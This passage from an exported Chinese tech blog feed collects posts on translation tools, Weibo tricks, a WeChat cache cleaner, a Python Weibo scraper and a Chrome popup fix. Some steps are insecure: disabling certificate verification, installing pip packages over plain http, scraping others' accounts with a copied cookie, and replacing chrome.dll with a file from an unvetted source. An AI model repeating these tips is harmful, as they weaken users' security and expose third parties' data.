&#39;假如爱有天意&#39;可以搜索到所有文件内含有假如爱有天意的文件和所在行。同样支持正则，比如搜索电影后带名字的主题曲rg -ie &#39;电影.*主题曲&#39; 最后总结下，目前我使用的搜索文件方案为wox+Everything，搜索文件内容使用的rg，如果你还有什么更好的搜索工具欢迎在文末留言。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 如何更优雅地使用微博 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好用的翻译工具]]></title>
    <url>%2F2020%2F06%2F24%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E7%BF%BB%E8%AF%91%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[苏生不惑第143 篇原创文章，将本公众号设为星标，第一时间看最新文章。 平常遇到不认识的单词可能习惯用百度翻译或者谷歌翻译，这里推荐些更好用的翻译工具。 谷歌翻译网址https://translate.google.cn/ 在国内就能直接打开，还有其他谷歌产品见之前文章那些在国内还能使用的谷歌产品 ps: 看板的英文是 kanban ，类似上海的英文shanghai，没想到吧，具体可看维基百科 https://en.m.wikipedia.org/wiki/Kanbankanban 划词翻译这是个Chrome扩展 https://chrome.google.com/webstore/detail/ikhdkkncnoglghljlkmcimlnlhkeamad，安装Chrome扩展见之前的文章 上不了谷歌如何安装 Chrome 扩展？ 支持谷歌、百度、有道三大翻译和朗读引擎，可以方便的查看、复制和朗读不同引擎的翻译结果，网页上选中文字直接翻译 。 彩云小译这也是个Chrome扩展https://fanyi.caiyunapp.com/#/web ，支持双语对照网页翻译 ，这样就可以直接看英文文章了。 它还有对应的APP https://fanyi.caiyunapp.com/#/app copytranslator复制即翻译的外文辅助阅读翻译解决方案， 主要是为了解决外文pdf的阅读翻译问题 https://copytranslator.github.io/ ，还提供客户端软件，支持windows和Mac deepl一个号称强过谷歌翻译的翻译神器 DeepL Translator ， 通过训练人工智能来理解和翻译文本，翻译出的内容读起来自然通顺，准确细致，有着接近真人语义的流畅品质，还有一个亮点是可以直接翻译Word（.docx）和PowerPoint（.pptx）文档 https://www.deepl.com/zh/translator https://www.deepl.com/zh/qualityJAZH.html 对比不同翻译工具的结果。还能翻译文言文 take the country’s life and death seriously对比下几个翻译平台还是Deepl效果最好 https://translate.minganci.org/ 多译多译助您快速翻译，提升翻译效率。支持 Mac 与 Windows 系统。https://duoyiapp.com/从文段翻译、截图翻译到字典查词，从自动识别、合并换行到自动复制，解决翻译中的各种难题，只为了更好的翻译体验。 学术全文翻译http://dict.cnki.net/还有知云文献翻译 http://i.zhiyunwenxian.cn/ 国际化翻译搜索作者收集了 3000 多万翻译数据，建立了一个搜索引擎，以后做国际化的就不用重复翻译了 https://i18ns.com/zh/index.html如果想翻译成各种语言使用 https://translate.i18ns.com/ 微信扫一扫翻译这个可能很少人用，毕竟微信的功能太多了，打开扫一扫，点击右下角的翻译。 再分享一个语言学习网站，有五十多种语言可选择 https://www.lingohut.com/zh 最后分享个学英语教程，公众号内回复 英语获取。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 如何更优雅地使用微博 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何更优雅地使用微博]]></title>
    <url>%2F2020%2F06%2F12%2F%E5%A6%82%E4%BD%95%E6%9B%B4%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%BE%AE%E5%8D%9A%2F</url>
    <content type="text"><![CDATA[苏生不惑第142篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微博之前写过以下文章： 那些你可能不知道的微博奇技淫巧 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 这里再分享下如何更优雅地使用微博。 微博热搜神器可以看到实时微博热搜词云图，最近周杰伦和杨丽萍都上热搜了https://www.enlightent.cn/research/rank/weiboSearchRank还可以查看热搜历史 https://www.weibotop.cn/ 微博传播分析输入微博地址可以查看这条微博的传播路径。http://www.weiboreach.com/main.html#zl/5df041ea712e3e65d22628fa比如李子柒的这条微博http://weibo.com/2970452952/F2UyCgVW5 明星关系图谱比如王菲的关系图谱（公众号内回复 微博 获取网址），可以关联到谢霆锋 https://desertsx.github.io/yulequan-relations-graph/ 备份微博微贝是一个微博备份的Chrome扩展， 可以用来批量备份你发布过的微博，关于安装和使用Chrome扩展见之前的文章上不了谷歌如何安装 Chrome 扩展？ ，下载地址 https://share.weiyun.com/56v1cyU，具体使用见微博https://weibo.com/1088413295/I7MAriyVV ，需要用微信扫码登录。如果想备份单条微博建议使用印象笔记，这个之前文章有介绍过 如何备份可能被删的公众号文章和网页 批量删除微博档案娘助手是一个可以用来实现批量操作的Chrome插件 https://chrome.google.com/webstore/detail/%E6%A1%A3%E6%A1%88%E5%A8%98%E5%8A%A9%E6%89%8B/abfopppplogcojgdcfhhffngkabbhifm?hl=zh-CN&amp;gl=US，你可以用它来批量删除微博、收藏和赞过的内容，避免被人挖坟，当然不想删你也可以设置微博半年可见。 http://weibo_tool.wbdacdn.com/ 微博相册批量下载这是个Chrome扩展 https://chrome.google.com/webstore/detail/octo%E5%BE%AE%E5%8D%9A%E7%9B%B8%E5%86%8C%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/cdimdlckbkfelaogjhfbkjcfncbpngkn?hl=zh-CN使用方法：进入微博首页或个人主页，点击图标，点击需要下载的相册。 过滤微博根据关键词、作者、话题、来源等过滤微博，清理版面，以及其他改造功能 https://tiansh.github.io/yawf/这个需要安装油猴脚本使用 https://greasyfork.org/zh-CN/scripts/3249-yet-another-weibo-filter，关于油猴看之前的文章[Chrome 浏览器扩展神器油猴](https://mp.weixin.qq.com/s/adJFh_9LH0N-vvvYaiQqXg) 安装后就可以设置关键词来过滤不想看的微博。 正确时间线微博使用无广告正确时间线的 h5 版微博 https://m.weibo.cn/ ，之前用Python分析微博数据也是基于这个。 还可以安装微博应用到本地。在 chrome://apps/ 可以看到。 解绑第三方应用 https://app.weibo.com/my 清理不认识的第三方应用。 查看最近取关粉丝https://dss.sc.weibo.com/h5/list/unfollower 找回误删微博https://new.vip.weibo.cn/prop/detail?id=4&amp;F=qbtq_hhy&amp;from=1084395010&amp;luicode=10000011&amp;disable_sinaurl=1 这个需要开通会员使用。 屏蔽功能https://new.vip.weibo.cn/prop/shield?luicode=10000011&amp;disable_sinaurl=1 屏蔽用户，屏蔽微博和关键词，这个也需要开通会员。 查看阳光信用https://service.account.weibo.com/sunshine/mysunshine?sinainternalbrowser=topnav 信用高可以评论区发图。关于微博信用积分扣除及恢复规则见 https://kefu.weibo.com/faqdetail?id=20822&amp;weiboauthoruid= 图片水印https://account.weibo.com/set/prefer 可以设置是否开启图片水印功能。 举报进度查询https://service.account.weibo.com/myexposures 微博超话签到超话一键签到 https://qian.wosuanle.com/ 阅读量数据https://dss.sc.weibo.com/h5/index 异常关注/点赞反馈https://security.weibo.cn/static/html/abnormalPraiseAttention/html/AbnormalPraiseAttentionService_Mobile_Index.php 遇到异常关注和点赞可以截图反馈。 微博问题反馈 https://kefu.weibo.com/form/feedback 转发不了微博，发布微博失败等问题可以这里反馈。 修正粉丝 https://kefu.weibo.com/correct 清理垃圾粉 微盘微盘虽然做的不如百度网盘 https://vdisk.weibo.com/share/hot ，但还是可以找到些资源的。 微博维权如果遇到被人肉可以拨打微博客服电话 4000960960 ，要求对方立即删除微博，情节严重的可以拿起法律武器保护自己，找律师给微博发律师函要ip地址 https://weibo.com/1836698272/J359G3y1V 还有可以使用互联网法院来维护权益，在线诉讼流程可以看豆瓣帖子 https://www.douban.com/group/topic/126517113/ 最后分享几个微博精选专题： 都是冷知识！快来涨姿势 https://weibo.com/a/hot/7569201727840257_1.html?type=new干货收集 https://weibo.com/a/hot/7558435451213825_1.html?type=new实用干货收纳 https://weibo.com/a/hot/7588358086270977_1.html 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[c 盘空间又满了？微信清理神器帮你释放空间]]></title>
    <url>%2F2020%2F06%2F12%2Fc-%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8F%88%E6%BB%A1%E4%BA%86%EF%BC%9F%E5%BE%AE%E4%BF%A1%E6%B8%85%E7%90%86%E7%A5%9E%E5%99%A8%E5%B8%AE%E4%BD%A0%E9%87%8A%E6%94%BE%E7%A9%BA%E9%97%B4%2F</url>
    <content type="text"><![CDATA[苏生不惑第141篇原创文章，将本公众号设为星标，第一时间看最新文章。 除了APP，平常用的最多还是微信桌面版 https://pc.weixin.qq.com/微信默认安装在c盘，微信群里发的图片，视频，文件都会自动保存在安装目录下，时间一长占用空间会越来越大。 如果你的c盘空间不够大，就会遇到c盘空间不足，你的系统就没法运行了，这里推荐一款微信清理工具。 微信垃圾清理微信垃圾清理工具（公众号内回复 清理 获取）会自动删除 PC 端微信缓存数据，包括所有聊天中自动下载的文件、视频、图片等数据，不会删除聊天文字记录，彻底释放你的硬盘空间。12345自动识别各个微信版本的默认存储路径，无需用户输入，且支持用户自定义的路径自由设置想要删除的文件类型，包括图片类缓存、文件、图片、视频自由设置需要删除的文件的距离时间，默认 365 天删除后的文件放置在回收站中，检查后自行清空，防止删错需要的文件；支持删除进度的显示 打开软件勾选要删除的文件类型和天数。如果你调整过微信保存文件路径 需要自己改下。怎么找这个路径呢？右键聊天记录里的文件或者视频点击 在文件夹显示。我的路径为 D:\weixin\WeChat Files\xxx ，xxx为你的微信号。 点击确定开始删除，回收站可以看到被删除的文件，之后清空回收站。 不过时间一长又要开始清理，很麻烦，所以还是建议更改下微信文件管理路径，比如保存到空间更大的e盘。 如果更改了文件保存路径，空间还是不够那就移动下软件安装目录吧。 移动软件安装路径如何把已经安装在系统盘c盘的软件，转移到其他盘呢？直接复制过去显然是不行的，这样软件直接打不开了，当然也可以直接卸载后重新安装，不过这样聊天记录就没了，推荐使用 FreeMove （公众号内回复 清理 获取），这是一款只有几百 KB免安装的小软件，不用安装直接运行 。 先选择你要移动的软件安装目录及移动后的目录，点击move就可以了。它还有中文版。 最后分享一款好用的软件卸载工具 Uninstall Tool （公众号内回复 清理 获取） 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信支付分开通了，来看看你有多少分]]></title>
    <url>%2F2020%2F06%2F05%2F%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%E5%88%86%E5%BC%80%E9%80%9A%E4%BA%86%EF%BC%8C%E6%9D%A5%E7%9C%8B%E7%9C%8B%E4%BD%A0%E6%9C%89%E5%A4%9A%E5%B0%91%E5%88%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第140 篇原创文章，将本公众号设为星标，第一时间看最新文章。 就在昨天（6月3日），对标支付宝芝麻信用的微信支付分正式上线了，不要再问微信支付分怎么开通了。现在直接打开微信（安卓版本7.0.15）&gt;我&gt;钱包，就可以看见支付分了。微信支付分是对你信用的综合评分，通过1000多个服务为你提供更简单便捷的生活方式，我已经有515位朋友开通了。 点击了解分数，微信支付分是对个人信用的综合评分，主要由以下信用评估得出： 身份特质：稳定的实名信息以及个人基本信息 支付行为：与使用微信支付相关的消费等行为。 信用历史：与微信支付分相关的守约，负面情况。 首次进入需要输入支付密码。我的支付分才664，看朋友圈有人800多分。看分数的进度条我的664还只在中间左右，看来分数很低了，可能我平时用支付宝比较多的缘故。我的芝麻信用766分，不过已经半年没涨了。可能跟花呗和借呗没开通过有关。 信用服务目前有1029个，比如免押金共享租物。 出行交通先用后付。 购物娱乐优惠先享，先用后付。 生活服务免预付费。住宿酒店免押金免查房。 如果对微信支付分有什么意见，可以点击右上角的。。。选择反馈与帮助进入小程序兔小巢社区，里面有各种问题解答。ps:如果你想收集用户反馈与建议，不用开发个新产品，直接用网页版 https://txc.qq.com/ 好了，现在打开你的微信钱包，看看你的微信支付分有多少吧，可以在评论区晒出来，应该有不少比我高的吧。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键备份微博并导出生成PDF，顺便用Python分析微博账号数据]]></title>
    <url>%2F2020%2F06%2F05%2F%E4%B8%80%E9%94%AE%E5%A4%87%E4%BB%BD%E5%BE%AE%E5%8D%9A%E5%B9%B6%E5%AF%BC%E5%87%BA%E7%94%9F%E6%88%90PDF%EF%BC%8C%E9%A1%BA%E4%BE%BF%E7%94%A8Python%E5%88%86%E6%9E%90%E5%BE%AE%E5%8D%9A%E8%B4%A6%E5%8F%B7%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[苏生不惑第139 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微博之前写过以下文章： 那些你可能不知道的微博奇技淫巧 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 这里再分享下如何快速导出你的所有微博数据，然后用Python分析某个微博账号的数据，比如高赞，转发，评论微博，微博词云，微博发布时间轴，以及使用的手机。 稳部落 这是一个专业备份导出微博记录工具 https://www.yaozeyuan.online/stablog/ ，备份原理是登录https://m.weibo.cn/ 后, 模拟浏览器访问, 获取登录用户发布的所有微博并备份，即使炸号的微博, 只要能登录 https://m.weibo.cn/ 后还能看见自己的微博就可以备份。 这个工具使用说明见 https://github.com/YaoZeyuan/stablog ，支持Windows和Mac版。 打开软件后登录自己的微博，这里也可以刷微博。 打开系统设置可以看到总共微博条数2695，有269页，抓取时间要2个多小时。 设置下排序规则，是否需要图片，PDF清晰度还有时间范围。123456789支持增量备份, 备份过一次后, 可以只备份前10页内容, 加快备份速度可在【管理数据】标签页中浏览已备份的微博记录列表支持断点续传, 中途停止后, 可以记下备份的页码, 再次运行时修改【备份范围】配置项, 从该页之后再备份即可32位操作系统下, 当pdf体积超过2GB后, 会提示文件已损坏. =&gt; 解决方案是更换64位操作系统, 或调整【时间范围】/【自动分卷】配置项, 通过限定单本pdf容量, 手工将pdf体积控制在2GB之内利用【开发者模式】配置项, 可以极大加快微博备份速度。 点击开始备份，可以看到运行日志。123456789102020-05-26 19:56:44.780: [FetchCustomer] 本次抓取的页码范围为:0~10 2020-05-26 19:56:44.824: [FetchCustomer] 准备抓取第1/271页微博记录 2020-05-26 19:56:45.275: [FetchCustomer] 第1/271页微博记录抓取成功, 准备存入数据库 2020-05-26 19:56:45.967: [FetchCustomer] 第1/271页微博记录成功存入数据库 2020-05-26 19:56:45.968: [FetchCustomer] 已抓取1/271页记录, 休眠20s, 避免被封 2020-05-26 19:57:05.970: [FetchCustomer] 准备抓取第2/271页微博记录 2020-05-26 19:57:06.310: [FetchCustomer] 第2/271页微博记录抓取成功, 准备存入数据库 2020-05-26 19:57:07.039: [FetchCustomer] 第2/271页微博记录成功存入数据库 2020-05-26 19:57:07.040: [FetchCustomer] 已抓取2/271页记录, 休眠20s, 避免被封 2020-05-26 19:57:27.041: [FetchCustomer] 准备抓取第3/271页微博记录 开始下载图片。 执行完毕，在本地生成了你的微博电子书。生成目录下有源文件和PDF。打开里面的HTML文件，备份的微博按照月份分类。看看2019年4月7号的这条微博，图片都下载到本地了。生成的PDF文件近30MB，不算太大。 这个工具只能备份自己的微博数据，如果想备份其他人的，可以使用下面的Python脚本，它还能分析某个微博账号的数据。 Python 备份和分析微博这是个开源项目https://github.com/nlpjoe/weiboSpider ，使用方法很简单，先登录微博复制你的cookie，然后修改配置文件，之后执行脚本就可以了，看我的操作流程。 打开 https://m.weibo.cn/ 登录你的微博账号获取headers的 cookie ，就是箭头里那一长串字符。下载代码到本地，由于是国外网站下载会比较慢，可以在公众号内回复 微博 获取。 之后修改配置文件config.json ，这里说明下，user_id_list填你要分析的微博账号uid，可以填多个，我这里填的是非常喜欢的歌手李健。filter为1表示分析原创微博，如果分析所有微博填0即可。since_date为从哪天的微博开始分析，然后就是把上面复制的cookie填到对应位置。 12345678910111213141516&#123; "user_id_list": ["1744395855"], "filter": 1, "since_date": "2015-01-01", "write_mode": ["csv", "txt"], "pic_download": 1, "video_download": 1, "cookie": "xxx", "mysql_config": &#123; "host": "localhost", "port": 3306, "user": "root", "password": "123456", "charset": "utf8mb4" &#125;&#125; 接着执行pip install -r requirements.txt安装以下依赖包。12345678requests==2.22.0jieba==0.42.1wordcloud==1.6.0scipy==1.2.1seaborn==0.10.0pandaslxmltqdm 当然你也可以单独安装 pip --trusted-host pypi.doubanio.com install -U tqdm -i http://pypi.doubanio.com/simple scipy要安装指定版本 pip --trusted-host pypi.doubanio.com install scipy==1.2.1 -i http://pypi.doubanio.com/simple 上面都配置好了，就开始执行脚本 python weibospider.py ，我是在Windows下使用的Python3.7，可能跟作者环境不一样，遇到了些问题。 如果执行出现错误SSLError(SSLCertVerificationError(1, &#39;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed ，改动文件 weibospider.py 里的requests请求参数。 html = requests.get(url, cookies=self.cookie,verify=False).content 需要注意如果提示cookie错误或已过期,再刷新下 m.weibo.cn复制cookie填到配置文件。没问题的话可以看到脚本开始执行了。 抓取完毕，开始生成李健的微博词云图，他的微博关键词为音乐，北京，朋友，歌手，电影，居然还提到了周杰伦。 每个月转发评论点赞总数图，可以看到2016-2018年的微博数据是高峰期。原创微博和转发微博数据比例。 李健发微博的工具主要为pc网页和iPad。生成的目录下还有所有微博的图片，视频，txt文件和excel数据。原创微博里转发最高的为2015年这条宣传电影《太平轮》主题曲 假如爱有天意 的微博https://www.weibo.com/1744395855/CruOoDGtB ，不过也才2万多，和某些动辄百万转发的流量明星的确不能比，毕竟人家水军多。下图是李健微博转发最高的20条微博，平均不到1万的转发和评论，点赞倒是都有几万。 ps:如果你想分析某个微博账号，自己又不会使用Python，联系我，包教包会，当然直接给你数据也可以。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 一个骚操作，公众号粉丝破10万！ 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地使用 bilibili(b站) 如何更优雅地看电影/刷剧 那些你可能不知道的网络冷知识奇技淫巧 2020 最全百度网盘搜索，找电影资源不再愁 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于公众号搜索和专辑]]></title>
    <url>%2F2020%2F06%2F05%2F%E5%85%B3%E4%BA%8E%E5%85%AC%E4%BC%97%E5%8F%B7%E6%90%9C%E7%B4%A2%E5%92%8C%E4%B8%93%E8%BE%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第138 篇原创文章，将本公众号设为星标，第一时间看最新文章。 每天都有小伙伴在公众号后台回复关键词，比如 百度网盘 根据关键词回复的内容一般都能解决你的问题，不过由于后台可设置的关键词数量有限，如果输入没有设置的关键词（比如网页去logo）会回复这个。 这个时候可以打开公众号右上角的搜索按钮。输入 去logo 就能找到这篇文章如何更优雅地看电影/刷剧 ，里面有详细说明如何去除腾讯优酷和爱奇艺视频上方的logo。 想查其他关键词也一样的。 如果文章里也没搜到，可以在点击这个菜单或者回复 微信 加我微信交流。 当然我看到后也会回复你的（可能不及时，因为白天要上班）。 在文章下的评论也是一样的。 另外文章开头也有个搜索。点击以后也会进入搜索界面，它会列出我设置的4个搜索词，可以直接点击列出的词搜索，或者自己输入关键词后搜索。 再说下新出的专辑，专辑就是一系列文章的集合，在每篇文章开头展示。点进去就是这个专辑下的文章列表，可以的话点个在看或者将专辑分享给其他小伙伴。 目前设置了7个专辑，可以点击下面文字进入查看。 玩转微信系列 实用工具系列 百度网盘系列 黑科技系列 Chrome扩展神器系列 这些网站有意思系列 生活系列 另外在公众号菜单里的历史文章可以浏览我发过的所有文章。 历史文章里几乎都是都是我原创写的文章（有原创标志，目前原创137篇，还在持续更新），都是我一个个字敲出来的，然后配图校对，一篇文章至少花费2-3个小时，比如之前这篇2020 年 3 月最新加速下载百度网盘文件方法 周末就花了4个小时，可以的话帮忙转发下。 不像有些公众号经常转载他人的文章，可以每天更新，而我平常上班忙，精力有限，只能周末抽空写文章，所以每周只能更新2-3篇原创，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能给你带来一点价值，对你有所帮助。 之前我分类整理过2019 年公众号 苏生不惑 近百篇原创文章整理，还有精选文章，这里再整理下今年发过的原创文章： 请停用以开发者模式运行的扩展程序？搞定谷歌浏览器插件弹窗 那些有趣的网站（二） 2020 最全百度网盘搜索，找电影资源不再愁 微信撤回的消息也能看到！ 如何找回bilibili(b站)收藏夹里失效的视频？ 听说 520 你还没对象，来这里看看 一个骚操作，公众号粉丝破10万！ 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 那些好用的 GIF 录制工具 那些好用的无版权免费图片网站 如何更优雅地看电影/刷剧 那些好玩的网站（二） 如何更优雅地使用 bilibili(b站) 网址太长了难看？生成个短网址吧 手把手教你申报2019个人所得税（已退税1800） 那些好玩的网站 如何搞定某些网站不让复制文字 2020 年 4 月使用 Aria2 加速下载百度网盘文件 关于 苏生不惑 公众号 2019 年我在知识星球上都发了些什么 那些有意思的谷歌/百度搜索彩蛋 那些有意思的网站彩蛋 2019 各大 APP 年度报告整理 微软全新浏览器 Microsoft Edge 比 谷歌 Chrome 好用吗？ 2020 新年福利，直接现金红包抽奖 快速了解新型肺炎疫情最新动态 10 秒钟给你的微信头像添加口罩 关注腾讯较真和微博辟谣，拒绝新型肺炎谣言 春节假期在家无聊？来这里看看 用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读 来看看你所在小区附近是否有新型肺炎疫情 那些有意思的网站（二） 身份证号码的秘密 那些实用的 Chrome 扩展神器（三） 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 分析你的浏览器历史记录，看看你喜欢访问哪些网站 你还没买到口罩吗？ 那些好玩的生成器网站（二） 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 –..—.–..-.-/-..–…-….–./——.-.-…-./-.-..–…..-.- 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 那些你可能不知道的网络冷知识奇技淫巧 那些你可能用得上的在线办公神器 上不了谷歌如何安装 Chrome 扩展？ 那些你可能用得上的在线办公神器（二） bilibili(b站)升级到BV号了，还想用av号怎么办？ 2020 年 3 月最新加速下载百度网盘文件方法 如何优雅的对网页截取长图 2020 年 4 月 4 日,互联网集体变灰 不想下载那么多音乐软件？全网音乐在线听和下载 疫情下的新浪工作日常 ps:由于现在公众号信息流乱序了，已经不按时间倒序来展示你关注的公众号更新，如果不想错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php Elasticsearch记录]]></title>
    <url>%2F2020%2F06%2F05%2Fphp-Elasticsearch%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[安装12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091composer require "elasticsearch/elasticsearch:~5.0"根据安装的版本来安装 https://packagist.org/packages/elasticsearch/elasticsearchuse Elasticsearch\ClientBuilder;$host = xxx; $port = xxx; $hosts = [$host.':'.$port]; $client = ClientBuilder::create() // 实例化 ClientBuilder -&gt;setHosts($hosts) // 设置主机信息 -&gt;build();$params = [ 'index' =&gt; xxx, 'type' =&gt; xxx, 'body' =&gt; [ 'query' =&gt; [ 'bool' =&gt; [ 'must' =&gt; [ //['match'=&gt;['id'=&gt;274100]], ], ] ], 'sort'=&gt; ['time' =&gt; 'desc'], ], 'size'=&gt;100 ];查询所有$response = $client-&gt;search($params);took: 2,timed_out: false,_shards:- &#123;total: 6,successful: 6,failed: 0&#125;,hits:- &#123;total: 280015,max_score: null,hits:- [-&#123;_index: "weibo",_type: "wb",_id: "2800",_score: null,_source:- &#123;id: 2800,mid: "451247565335367",is_top: 0,tags:[],time: "2020-06-05 15:18:16"&#125;,sort:- [1591370296000]&#125;$match = []; $not = []; if ($params['is_top'])&#123; $match[] = ['term'=&gt;['is_top'=&gt;$params['is_top']]]; &#125; if ($params['tag'] == 1)&#123; $match[] = ['exists'=&gt;['field'=&gt;'tags']];//tags不为空 &#125; if ($params['start_time'] &amp;&amp; $params['end_time'] &amp;&amp; $params['end_time'] &gt; $params['start_time'])&#123; $match[] = ['range'=&gt;['wb_time' =&gt; ['gte'=&gt;$params['start_time'], 'lte'=&gt; $params['end_time']]]]; &#125;if ($params['tag'] == 0)&#123; $not[] = ['exists'=&gt;['field'=&gt;'tags']];//tags为空 &#125; $must = [['terms'=&gt;['is_top'=&gt;1]]]; if ($match)&#123; $must = array_merge($must,$match); &#125; if ($params['tags'])&#123; $must[] = ['query_string'=&gt;['fields'=&gt;['tags'],'query'=&gt;'*微博*']];//like &#125; $search = [ 'index' =&gt; xxx, 'type' =&gt; xxx, 'body' =&gt; [ 'query' =&gt; [ 'bool' =&gt; [ 'must' =&gt; $must, 'must_not'=&gt;$not, ], ], 'sort'=&gt; ['time' =&gt; 'desc'] ], 'from' =&gt; 1, 'size' =&gt; 10, ]; $response = $client-&gt;search($search); 笔记二十：Query &amp; Filtering 与 多字符串多字段查询 中文文档 PHP DSL 查修构造器扩展 Elasticsearch: 权威指南]]></content>
  </entry>
  <entry>
    <title><![CDATA[请停用以开发者模式运行的扩展程序？搞定谷歌浏览器插件弹窗]]></title>
    <url>%2F2020%2F05%2F29%2F%E8%AF%B7%E5%81%9C%E7%94%A8%E4%BB%A5%E5%BC%80%E5%8F%91%E8%80%85%E6%A8%A1%E5%BC%8F%E8%BF%90%E8%A1%8C%E7%9A%84%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F%EF%BC%9F%E6%90%9E%E5%AE%9A%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6%E5%BC%B9%E7%AA%97%2F</url>
    <content type="text"><![CDATA[苏生不惑第137篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于谷歌浏览器之前写过很多实用扩展： 那些我常用的 Chrome 扩展 那些我常用的 Chrome 扩展（二） 那些我常用的 Chrome 扩展（三） 那些实用的 Chrome 扩展神器 那些实用的 Chrome 扩展神器（二） Chrome 浏览器扩展神器油猴 Chrome 浏览器扩展神器暴力猴 如何用 Chrome 扩展备份你的 QQ 空间相册 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 也可以进入文章开头的专辑查看。 为什么我一直推荐使用谷歌浏览器呢，某些浏览器会自作主张封杀某些域名，还经常弹各种广告，当然更主要的是方便我使用谷歌搜索。 而且谷歌浏览器可以直接在 https://www.google.cn/chrome/ 下载，还有很多谷歌产品在国内都可以直接打开，可以看看我之前的文章那些在国内还能使用的谷歌产品 最新版83.0.4103.61还上线了标签页分组功能，如果你经常开很多标签不好找的话可以试试这个功能，可以将相同类型的标签放在同一标签组内，通过颜色名称来区分标签栏。起个名字叫谷歌。 如果你升级到最新版还没这个功能，打开 chrome://flags/#tab-groups 更改为enabled，然后重启浏览器。 如果你习惯用微软的浏览器，推荐使用最新版的 Microsoft Edge ，之前写过文章介绍 微软全新浏览器 Microsoft Edge 比 谷歌 Chrome 好用吗？ ，现在它也学谷歌开发了在线游戏，直接打开 edge://surf/ 开始玩。如果你上不了谷歌，手动安装了扩展（参考之前的文章上不了谷歌如何安装 Chrome 扩展？），每次打开浏览器都会有个弹窗，得手动关闭这个提示，很是烦人。 这里分享2个方法解决这个问题。 替换 chrome.dll首先打开 chrome://settings/help 将谷歌浏览器升级到最新版 83.0.4103.61升级完需要重启浏览器。右键谷歌浏览器图标找到安装位置。进入目录 C:\Program Files (x86)\Google\Chrome\Application\83.0.4103.61 替换谷歌浏览器安装目录下的chrome.dll（公众号内回复 谷歌 